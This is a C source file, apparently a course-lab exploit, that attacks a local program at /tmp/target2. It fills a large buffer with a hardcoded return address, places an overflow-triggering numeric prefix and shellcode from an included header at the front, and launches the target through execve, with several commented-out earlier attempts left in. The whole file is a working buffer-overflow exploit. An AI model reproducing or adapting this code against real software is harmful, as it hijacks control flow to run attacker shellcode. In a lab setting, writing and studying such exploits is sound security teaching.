#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"
#define SIZE 37952

int main(void)
{
	char arg1[SIZE];// = "1,\xC1\xFE\xD1\xAE\xC1\xFE\xD1\xAE\xC1\xFE\xD1\xAE\x55\x55\xaa\xaa";
	char *args[] = { TARGET, arg1, NULL };
	char *env[] = { NULL };

	//int target = 0xbeff69a8;
//"1,\xC1\xFE\xD1\xAE\xC1\xFE\xD1\xAE\xC1\xFE\xD1\xAE\x55\x55\xaa\xaa";

	//const char *in = "1,\xC1\xFE\xD1\xAE\xC1\xFE\xD1\xAE\xC1\xFE\xD1\xAE\x55\x55\xaa\xaa";
	char *in = " 4093641297,";

  long retAddr, *addrPtr;
//retAddr = 0xbefed598;
//retAddr = 0x98befed5;
//  retAddr = 0x98befed5;
  retAddr = 0xbefed578;
  int i;

  addrPtr = (long *) arg1; 
//  *((int *) (arg1 + 156))
//addrPtr = *((long *) (arg1+2));
  for (i = 0; i < SIZE; i += 4)
    *(addrPtr++) = retAddr;
//
//memset(arg1, retAddr, SIZE);
  //memset(arg1, 'A', SIZE);

	memcpy(arg1, in, strlen(in));

	memcpy(arg1 + strlen(in), shellcode, strlen(shellcode));

	//	*((long *) (arg1 + (SIZE-4))) = retAddr;

	arg1[SIZE-1] = 0;
	//memset(arg1, 'A', strlen(arg1));
	//memcpy(arg1, in, strlen(in));
	
    //char result[strlen(in)+strlen(shellcode)+ 1];//+1 for the zero-terminator
    //char result[strlen(in)+1];
    //in real code you would check for errors in malloc here
    
   // strcpy(result, in);
    //strcat(result, shellcode);

	//memcpy(arg1, in, strlen(in));

	//*((int *) (arg1 +534)) = target;

	if (0 > execve(TARGET, args, env))
		fprintf(stderr, "execve failed.\n");

	return 0;
}
